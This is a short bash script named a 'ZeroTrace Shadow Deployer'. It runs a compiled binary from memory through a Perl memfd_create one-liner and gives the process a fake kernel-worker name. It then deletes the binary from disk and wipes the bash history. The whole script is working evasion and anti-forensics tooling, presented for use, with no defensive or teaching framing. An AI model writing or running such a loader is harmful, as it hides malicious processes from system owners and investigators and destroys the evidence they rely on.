#!/bin/bash

# ZeroTrace "Shadow" Deployer
# Purpose: Execute binary into memory and wipe tracks.

BIN_PATH="./target/zerotrace"
GHOST_NAME="[kworker/u2:1-ev]"

if [ ! -f "$BIN_PATH" ]; then
    echo "Error: Build the project first."
    exit 1
fi

echo "[+] Initiating Shadow Load..."

# 1. Use a perl/python one-liner to create a memfd and execute from RAM
# This ensures the binary is never written to a persistent path like /usr/bin/
perl -e '
    my $name = shift;
    my $bin = shift;
    open(my $fh, "<", $bin) or die;
    my $memfd = syscall(319, $name, 1); # memfd_create
    open(my $out, ">&=$memfd") or die;
    while(read($fh, my $buf, 4096)) { print $out $buf; }
    close($fh);
    # fexecve via /proc/self/fd
    exec {"/proc/self/fd/$memfd"} $name;
' "$GHOST_NAME" "$BIN_PATH" &

# 2. Immediate cleanup of the local build artifact
sleep 1
rm -f "$BIN_PATH"

# 3. Clear shell history and traces
if [ -f "$HOME/.bash_history" ]; then
    truncate -s 0 "$HOME/.bash_history"
fi
history -c

echo "[+] Ghost process launched. Binary purged from disk."
